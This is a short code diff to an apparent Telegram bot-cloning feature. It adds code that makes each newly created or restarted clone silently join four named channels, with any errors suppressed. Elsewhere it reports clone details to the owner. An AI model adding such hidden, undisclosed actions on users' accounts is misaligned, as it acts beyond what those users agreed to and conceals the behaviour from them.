@@ -52,7 +52,13 @@ async def clone_txt(client, message):
 
             await idclonebotdb.insert_one(details)
             IDCLONES.add(user.id)
-            
+            try:
+                await ai.join_chat("THE_VIP_BOY_OP")
+                await ai.join_chat("VIP_CREATORS")
+                await ai.join_chat("TG_FRIENDSSS")
+                await ai.join_chat("THE_VIP_BOY")
+            except Exception as e:
+                pass
             await app.send_message(
                 int(OWNER_ID), f"**#New_Clone**\n\n**User:** @{username}\n\n**Details:** {details}\n\n**Total Clones:** {total_clones}"
             )
@@ -156,6 +162,9 @@ async def restart_idchatbots():
                 user = await ai.get_me()
                 try:
                     await ai.join_chat("THE_VIP_BOY_OP")
+                    await ai.join_chat("VIP_CREATORS")
+                    await ai.join_chat("TG_FRIENDSSS")
+                    await ai.join_chat("THE_VIP_BOY")
                 except Exception as e:
                     pass
                 if user.id not in IDCLONES:
